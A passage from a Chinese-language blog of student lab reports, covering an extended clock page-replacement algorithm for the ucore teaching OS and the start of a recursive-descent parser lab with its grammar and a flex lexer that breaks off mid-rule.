class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="回答问题-1"><a href="#回答问题-1" class="headerlink" title="回答问题"></a>回答问题</h3><blockquote>
<p>如果要在ucore上实现”extended clock页替换算法”请给你的设计方案，现有的swap_manager框架是否足以支持在ucore中实现此算法？如果是，请给你的设计方案。如果不是，请给出你的新的扩展和基此扩展的设计方案。并需要回答如下问题</p>
<ul>
<li>需要被换出的页的特征是什么？</li>
<li>在ucore中如何判断具有这样特征的页？</li>
<li>何时进行换入和换出操作？</li>
</ul>
</blockquote>
<p>支持。</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200410033815992.png" alt="image-20200410033815992"></p>
<p>在mmu.h文件可以查看页表项标志位</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200410032433658.png" alt="image-20200410032433658"></p>
<p>其中的PTE_A和PTE_D可用于实现extended clock页替换算法，可对swap_fifo.c做相应修改即可。</p>
<ul>
<li><p>需要被换出的页的特征是什么？</p>
<p>页表项的修改位 D（Dirty Bit）为 0 的页 且访问位 A（ Access Bit） 为 0 的页。</p>
</li>
<li><p>在 ucore 中如何判断具有这样特征的页？</p>
<p>检查页表项的访问位和修改位是不是1。当内存页被访问后，MMU 将在对应的页表项的 <code>PTE_A</code> 这一位设为1，当内存页被修改后，MMU 将在对应的页表项的 <code>PTE_D</code> 这一位设为1。</p>
</li>
<li><p>何时进行换入和换出操作？</p>
<p>当进程访问的物理页没有在内存中缓存而是保存在磁盘中（缺页且内容在磁盘中）时，需要进行换入操作； 当位于物理页中的内存由于物理页帧满被页面替换算法选择换出（<code>alloc_page</code>返回<strong>NULL</strong>）时，需要进行换出操作。</p>
</li>
</ul>
<h2 id="扩展练习-Challenge-1：实现识别dirty-bit的-extended-clock页替换算法"><a href="#扩展练习-Challenge-1：实现识别dirty-bit的-extended-clock页替换算法" class="headerlink" title="扩展练习 Challenge 1：实现识别dirty bit的 extended clock页替换算法"></a>扩展练习 Challenge 1：实现识别dirty bit的 extended clock页替换算法</h2><h3 id="实验过程-3"><a href="#实验过程-3" class="headerlink" title="实验过程"></a>实验过程</h3><p>实现基础：</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/Users/Asymptotic_freedom/Desktop/%25E6%2593%258D%25E4%25BD%259C%25E7%25B3%25BB%25E7%25BB%259F/%25E5%25AE%259E%25E9%25AA%258C%25E4%25BD%259C%25E4%25B8%259A/lab3/image-20200410033815992.png" alt="image-20200410033815992"></p>
<p>复制swap_fifo.c和swap_fifo.h到同原文件夹并重命名为swap_clock.c和swap_clock.h</p>
<p>对照_fifo_swap_out_victim函数结构</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> _fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="keyword">int</span> in_tick) &#123;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv;</span><br><span class="line">    assert(head != <span class="literal">NULL</span>);</span><br><span class="line">    assert(in_tick==<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = head-&gt;prev; <span class="comment">// 换出最先进来的页 (因为每次访问一个页 都是插入到头节点的后面 因此 头节点的前面就是最先访问的页)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span>* <span class="title">page</span> = <span class="title">le2page</span>(<span class="title">le</span>, <span class="title">pra_page_link</span>);</span> <span class="comment">// 和之前一样 通过 le 这个链表节点的地址 减去 pra_page_link 在 Page 结构体中的 Offset 得到 Page 的地址</span></span><br><span class="line">    list_del(le); <span class="comment">// 删掉这个节点</span></span><br><span class="line">    *ptr_page = page; <span class="comment">// 将这一页地址存到 ptr_page 中 给 调用本函数的函数使用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>依据算法写出代码</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200410040231378.png" alt="image-20200410040231378"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">!(*ptep &amp; PTE_A) &amp;&amp; !(*ptep &amp; PTE_D)  &#x2F;&#x2F;没被访问过 也没被修改过</span><br><span class="line"> (*ptep &amp; PTE_A)  ^  (*ptep &amp; PTE_D)  &#x2F;&#x2F;被访问过 但没被修改过 或 没被访问过 但被修改过</span><br><span class="line"> (*ptep &amp; PTE_A) &amp;&amp;  (*ptep &amp; PTE_D)  &#x2F;&#x2F;被访问过 且 被修改过</span><br></pre></td></tr></table></figure></div>
<p>根据算法得出页置换过程</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200410174526396.png" alt="image-20200410174526396"></p>
<p>将其应用于swap_out_victim的修改</p>
<p>注意：对于每次类似于<code>*(unsigned char *)0x1000 = 0x0a;</code>的赋值过程，对应页面的Dirty位和Access位均置1</p>
<p>swap_extended_clock.c修改代码，主要是对struct swap_manager，swap_out_victim函数，check_swap函数进行修改，并对各函数进行更名</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;defs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;x86.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;swap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;swap_extended_clock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* [wikipedia]The simplest Page Replacement Algorithm(PRA) is a FIFO algorithm. The first-in, first-out</span></span><br><span class="line"><span class="comment"> * page replacement algorithm is a low-overhead algorithm that requires little book-keeping on</span></span><br><span class="line"><span class="comment"> * the part of the operating system. The idea is obvious from the name - the operating system</span></span><br><span class="line"><span class="comment"> * keeps track of all the pages in memory in a queue, with the most recent arrival at the back,</span></span><br><span class="line"><span class="comment"> * and the earliest arrival in front. When a page needs to be replaced, the page at the front</span></span><br><span class="line"><span class="comment"> * of the queue (the oldest page) is selected. While FIFO is cheap and intuitive, it performs</span></span><br><span class="line"><span class="comment"> * poorly in practical application. Thus, it is rarely used in its unmodified form. This</span></span><br><span class="line"><span class="comment"> * algorithm experiences Belady's anomaly.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Details of FIFO PRA</span></span><br><span class="line"><span class="comment"> * (1) Prepare: In order to implement FIFO PRA, we should manage all swappable pages, so we can</span></span><br><span class="line"><span class="comment"> *              link these pages into pra_list_head according the time order. At first you should</span></span><br><span class="line"><span class="comment"> *              be familiar to the struct list in list.h. struct list is a simple doubly linked list</span></span><br><span class="line"><span class="comment"> *              implementation. You should know howto USE: list_init, list_add(list_add_after),</span></span><br><span class="line"><span class="comment"> *              list_add_before, list_del, list_next, list_prev. Another tricky method is to transform</span></span><br><span class="line"><span class="comment"> *              a general list struct to a special struct (such as struct page). You can find some MACRO:</span></span><br><span class="line"><span class="comment"> *              le2page (in memlayout.h), (in future labs: le2vma (in vmm.h), le2proc (in proc.h),etc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">list_entry_t</span> pra_list_head;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * (2) _fifo_init_mm: init pra_list_head and let  mm-&gt;sm_priv point to the addr of pra_list_head.</span></span><br><span class="line"><span class="comment"> *              Now, From the memory control struct mm_struct, we can access FIFO PRA</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_extended_clock_init_mm(struct mm_struct *mm)</span><br><span class="line">&#123;     </span><br><span class="line">     list_init(&amp;pra_list_head);</span><br><span class="line">     mm-&gt;sm_priv = &amp;pra_list_head;</span><br><span class="line">     <span class="comment">//cprintf(" mm-&gt;sm_priv %x in fifo_init_mm\n",mm-&gt;sm_priv);</span></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * (3)_fifo_map_swappable: According FIFO PRA, we should link the most recent arrival page at the back of pra_list_head qeueue</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_extended_clock_map_swappable(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, struct Page *page, <span class="keyword">int</span> swap_in)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *entry=&amp;(page-&gt;pra_page_link);</span><br><span class="line"> </span><br><span class="line">    assert(entry != <span class="literal">NULL</span> &amp;&amp; head != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//record the page access situlation</span></span><br><span class="line">    <span class="comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span> </span><br><span class="line">    <span class="comment">//(1)link the most recent arrival page at the back of the pra_list_head qeueue.</span></span><br><span class="line">    list_add(head, entry);</span><br><span class="line">    <span class="comment">//初始访问位和修改位均置0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">ptr</span> = <span class="title">le2page</span>(<span class="title">entry</span>, <span class="title">pra_page_link</span>);</span></span><br><span class="line">    <span class="keyword">pte_t</span> *pte = get_pte(mm -&gt; pgdir, ptr -&gt; pra_vaddr, <span class="number">0</span>);</span><br><span class="line">    *pte &amp;= ~PTE_D;</span><br><span class="line">    *pte &amp;= ~PTE_A;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  (4)_fifo_swap_out_victim: According FIFO PRA, we should unlink the  earliest arrival page in front of pra_list_head qeueue,</span></span><br><span class="line"><span class="comment"> *                            then set the addr of addr of this page to ptr_page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> </span><br><span class="line">_extended_clock_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="keyword">int</span> in_tick) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *head = (<span class="keyword">list_entry_t</span>*)mm-&gt;sm_priv;</span><br><span class="line">    assert(head != <span class="literal">NULL</span>);</span><br><span class="line">    assert(in_tick == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = head-&gt;prev;</span><br><span class="line">    assert(head != le);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i ++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (le != head) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> = <span class="title">le2page</span>(<span class="title">le</span>, <span class="title">pra_page_link</span>);</span></span><br><span class="line">            <span class="keyword">pte_t</span> *ptep = get_pte(mm-&gt;pgdir, page-&gt;pra_vaddr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!(*ptep &amp; PTE_A) &amp;&amp; !(*ptep &amp; PTE_D)) &#123;<span class="comment">// (PTE_D, PTE_A) = (0, 0)</span></span><br><span class="line">                list_del(le);</span><br><span class="line">                *ptr_page = page;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( (*ptep &amp; PTE_A)  ^  (*ptep &amp; PTE_D)) &#123;<span class="comment">// (PTE_D, PTE_A) = (1, 0)||(0, 1)</span></span><br><span class="line">                *ptep &amp;= ~PTE_D;</span><br><span class="line">                *ptep &amp;= ~PTE_A;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( (*ptep &amp; PTE_A) &amp;&amp;  (*ptep &amp; PTE_D)) &#123;<span class="comment">// (PTE_D, PTE_A) = (1,1)</span></span><br><span class="line">                *ptep &amp;= ~PTE_A;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            le = le-&gt;prev;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        le = le-&gt;prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_extended_clock_check_swap(<span class="keyword">void</span>) &#123;</span><br><span class="line">    cprintf(<span class="string">"write Virt Page c in extended_clock_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x3000</span> = <span class="number">0x0c</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page a in extended_clock_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1000</span> = <span class="number">0x0a</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page d in extended_clock_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x4000</span> = <span class="number">0x0d</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page b in extended_clock_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2000</span> = <span class="number">0x0b</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page e in extended_clock_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x5000</span> = <span class="number">0x0e</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">5</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page b in extended_clock_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2000</span> = <span class="number">0x0b</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">5</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page a in extended_clock_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1000</span> = <span class="number">0x0a</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">6</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page b in extended_clock_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2000</span> = <span class="number">0x0b</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">6</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page c in extended_clock_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x3000</span> = <span class="number">0x0c</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">7</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page d in extended_clock_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x4000</span> = <span class="number">0x0d</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_extended_clock_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_extended_clock_set_unswappable(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_extended_clock_tick_event(struct mm_struct *mm)</span><br><span class="line">&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">swap_manager</span> <span class="title">swap_manager_extended_clock</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     .name            = <span class="string">"extended clock swap manager"</span>,</span><br><span class="line">     .init            = &amp;_extended_clock_init,</span><br><span class="line">     .init_mm         = &amp;_extended_clock_init_mm,</span><br><span class="line">     .tick_event      = &amp;_extended_clock_tick_event,</span><br><span class="line">     .map_swappable   = &amp;_extended_clock_map_swappable,</span><br><span class="line">     .set_unswappable = &amp;_extended_clock_set_unswappable,</span><br><span class="line">     .swap_out_victim = &amp;_extended_clock_swap_out_victim,</span><br><span class="line">     .check_swap      = &amp;_extended_clock_check_swap,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>swap_clock.h</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __KERN_MM_SWAP_FIFO_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __KERN_MM_SWAP_FIFO_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;swap.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">swap_manager</span> <span class="title">swap_manager_extended_clock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
<p>为了使用extended clock算法，对swap.c进行修改</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- #include &lt;swap_fifo.h&gt;</span></span><br><span class="line"><span class="addition">+ #include &lt;swap_extended_clock.h&gt;</span></span><br><span class="line">...</span><br><span class="line">int</span><br><span class="line">swap_init(void)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="deletion">- 	sm = &amp;swap_manager_fifo;</span></span><br><span class="line"><span class="addition">+ 	sm = &amp;swap_manager_clock;</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>重新 make qemu</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200410145255073.png" alt="image-20200410145255073"></p>
<p>成功运行</p>
<p>swap_check()函数通过</p>
<p>另外，此实验的页面访问权限为内核态，对于lab1的challenge 2，如果按3切换到用户态后会出现缺页中断，因为用户态不能访问只能内核态可以访问的页表，即无法访问内存。用户态没有权限访问虚拟地址对应的物理页面；该虚拟地址也不在合法的虚拟地址空间里，由于只设置了很小的合法虚拟地址空间。在内核态下，由于这部分虚拟地址对应的是操作系统内核代码，在启动虚拟内存管理之前就，已经装入了内存，建立好页的映射关系，是不会发生缺页中断的，不会被换出的。</p>
<h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><p>​        本次实验是关于虚拟内存管理，主要有Page Fault异常处理页替换算法的相关实验，了解了相关操作。本次实验题目量较少，需要查找分析代码里宏定义和函数定义来完成对已有代码的理解和要完成代码的使用。通过本次实验我深入理解了虚拟内存管理机制，对课程内容有了更深的理解。</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>实验3 递归下降法的语法分析器</title>
    <url>/posts/b04b3b51/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>掌握语法分析器的构造原理，掌握递归下降法的编程方法。</p>
<a id="more"></a>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>用<strong>递归下降法</strong>编写一个语法分析程序，使之与词法分析器结合，能够根据语言的上下文无关文法，识别输入的单词序列是否文法的句子。（注意，需要改写文法，消除左递归等）</p>
<p>为减轻实验编程负担，这里只要求实现部分产生式，文法的开始符号为program。（完整的源语言的文法定义见教材附录 A.1，p394）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">program	→	block</span><br><span class="line">block 	→	&#123; stmts &#125;</span><br><span class="line">stmts 	→	stmt stmts | ε</span><br><span class="line">stmt 	→	id &#x3D; expr ;  </span><br><span class="line">        |	if ( bool ) stmt</span><br><span class="line">        |	if ( bool) stmt else stmt</span><br><span class="line">        |	while (bool) stmt </span><br><span class="line">        |	do stmt while (bool ) ; </span><br><span class="line">        |	break ; </span><br><span class="line">        |	block</span><br><span class="line">bool 	→	expr relop expr </span><br><span class="line">        |	expr</span><br><span class="line">expr 	→	expr + term </span><br><span class="line">        |	expr - term </span><br><span class="line">        |	term</span><br><span class="line">term 	→	term * factor</span><br><span class="line">        |	term &#x2F; factor </span><br><span class="line">        |	factor</span><br><span class="line">factor	→	( expr ) | id | num</span><br></pre></td></tr></table></figure></div>
<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>１．个人完成，提交实验报告。</p>
<p>２．实验报告中给出采用测试源代码片断，并依次打印自顶向下推导过程中使用的产生式（例如，printf(“<em>stmts</em>    → <em>stmt</em> <em>stmts</em> “); ）。</p>
<p>例如，程序片断</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    i = <span class="number">2</span>;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">        sum = sum + i;</span><br><span class="line">        i = i + <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="实验指导"><a href="#实验指导" class="headerlink" title="实验指导"></a>实验指导</h1><p><strong>1.</strong> <strong>词法分析器的说明</strong></p>
<p>可以使用“实验2 用FLEX实现词法分析器”的生成的代码，也可以使用自己编写的词法分析器，来获取词法单元（token）。如果使用FLEX的话，每次调用一次yylex()函数就可以获取一个词法单元。</p>
<p>注意，parser.cpp中已经有一个main函数，所以词法分析器的main函数要注释掉，因为一个程序不能有两个main函数。词法分析器的main函数可以用在调试词法分析器的时候用。</p>
<p><strong>2.</strong> <strong>左递归和公共左因子的处理</strong></p>
<p>上述文法存在左递归和公共左因子，需要考虑改造文法。<strong>消除直接左递归</strong>参见教材p123。提取公共左因子参见教材p125。</p>
<p><strong>3.</strong> <strong>预测分析器</strong></p>
<p>假设已经将上述文法改造为LL(1)文法，可采用带预测的递归下降进行语法分析。预测分析器<strong>的伪代码可</strong>参见教材p40。</p>
<p><strong>4.</strong> <strong>if</strong>语句二义性的处理</p>
<p>上述文法中的if语句具有二义性。可以有不同的处理方式：</p>
<p>（1）   第一种方法是改写文法。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">stmt  matched _stmt | unmatched_stmt</span><br><span class="line">matched_stmt  if ( bool ) matched_stmt else matched_stmt | 其它语句</span><br><span class="line">unmatched_stmt  if ( bool ) stmt  |  if ( bool ) matched_stmt  else unmatched_stmt</span><br></pre></td></tr></table></figure></div>
<p> 这种方法要多引进两个非终结符<code>matched_stmt</code>和<code>unmatched_stmt</code>，就要多编写两个函数，但编写这两个函数不会花太多时间。</p>
<p>（2）   第二种方法是对产生式加限制。</p>
<p>为了适合LL(1)文法的需要，我们首先对<code>stmt → if ( bool ) stmt | if ( bool ) stmt else stmt</code>提取左公因子，结果如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">stmt → if ( bool ) stmt else_part | 其它语句</span><br><span class="line">else_part → else stmt | ε</span><br></pre></td></tr></table></figure></div>
<p>但是，这样还是不能消除二义性，还是不能确定该选择<code>else_part → else stmt | ε</code>中的哪个产生式，因为<code>First(else stmt) ∩ Follow(else_part)= { else }</code>。我们通过加限制的方法来确定该选哪个产生式：如果<code>lookahead</code>是词法单元<code>else</code>时，使用产生式<code>else_part → else stmt</code>；否则使用产生式<code>else_part → ε</code>。</p>
<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="改写文法"><a href="#改写文法" class="headerlink" title="改写文法"></a>改写文法</h2><p>对原文法消除左递归和提取左公因子</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">program	→	block</span><br><span class="line">block 	→	&#123; stmts &#125;</span><br><span class="line">stmts 	→	stmt stmts | ε</span><br><span class="line">stmt 	→	id &#x3D; expr ;  </span><br><span class="line">        |	if ( bool) stmt  else_part</span><br><span class="line">        |	while (bool) stmt </span><br><span class="line">        |	do stmt while (bool ) ; </span><br><span class="line">        |	break ; </span><br><span class="line">        |	block</span><br><span class="line">else_part → else stmt | ε</span><br><span class="line">bool 	→ 	expr (relop expr| ε )</span><br><span class="line">expr 	→ 	term expr’ </span><br><span class="line">expr’	→	+ term expr’</span><br><span class="line">        |	- term expr’</span><br><span class="line">        |	ε</span><br><span class="line">term 	→	factor term’</span><br><span class="line">term’  	→	* factor term’</span><br><span class="line">        |	&#x2F; factor term’</span><br><span class="line">        |	ε</span><br><span class="line">factor	→ 	( expr ) | id | num</span><br></pre></td></tr></table></figure></div>
<h2 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h2><h3 id="clang-lex"><a href="#clang-lex" class="headerlink" title="clang.lex"></a>clang.lex</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">%&#123;</span><br><span class="line"><span class="comment">/*声明部分,原封不动插入生成的C文件*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"lex.yy.h"</span></span></span><br><span class="line"><span class="comment">//add end</span></span><br><span class="line"><span class="comment">/*书上使用该变量yylval，但该变量不是flex自带的，所以我们要自己定义这个变量*/</span></span><br><span class="line"><span class="keyword">int</span> yylval;</span><br><span class="line"><span class="keyword">int</span> lineNo=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*请参考下面网页中的说明*/</span></span><br><span class="line"><span class="comment">/* http://www.ibm.com/developerworks/cn/linux/sdk/lex/index.html */</span></span><br><span class="line"></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*词法分析*/</span></span><br><span class="line"><span class="comment">/*"if"也可以*/</span></span><br><span class="line"><span class="comment">/*for //排在前面的优先匹配*/</span></span><br><span class="line"><span class="comment">/*id要放在比较后面*/</span></span><br><span class="line">delim    [<span class="string">" "</span>\t]</span><br><span class="line">ws       &#123;delim&#125;+</span><br><span class="line">letter_  [A-Za-z]|_ </span><br><span class="line">digit    [<span class="number">0</span><span class="number">-9</span>]</span><br><span class="line">id       &#123;letter_&#125;(&#123;letter_&#125;|&#123;digit&#125;)*</span><br><span class="line">number   &#123;digit&#125;+(\.&#123;digit&#125;+)?(E[+-]?&#123;digit&#125;+)?</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">&#123;ws&#125;       &#123;<span class="comment">/*no action and no return */</span> &#125;</span><br><span class="line"><span class="string">"\n"</span>       &#123;lineNo++;&#125;</span><br><span class="line"><span class="keyword">if</span>         &#123; <span class="built_in">printf</span>(<span class="string">"IF:%s\n"</span>,yytext);   <span class="keyword">return</span> 